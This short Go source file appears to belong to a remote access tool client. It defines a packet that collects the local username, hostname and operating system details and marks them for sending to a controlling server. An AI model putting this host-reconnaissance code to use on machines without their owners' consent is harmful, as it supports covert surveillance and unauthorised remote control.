package main

import (
	"fmt"
	"oslib"
	"rat/client/computer"
	"rat/common"
)

type ComputerInfoPacket struct {
	Username                   string `network:"send"`
	Hostname                   string `network:"send"`
	OperatingSystemName        string `network:"send"`
	OperatingSystemDisplayName string `network:"send"`
}

func (packet ComputerInfoPacket) Header() common.PacketHeader {
	return common.ComputerInfoHeader
}

func (packet *ComputerInfoPacket) Init() {
	u := computer.GetComputerInformation()

	packet.Username = u.Username
	packet.Hostname = u.Hostname
	packet.OperatingSystemName = oslib.Name
	packet.OperatingSystemDisplayName = oslib.GetDisplay()

	fmt.Println("Inside init()", packet)
}
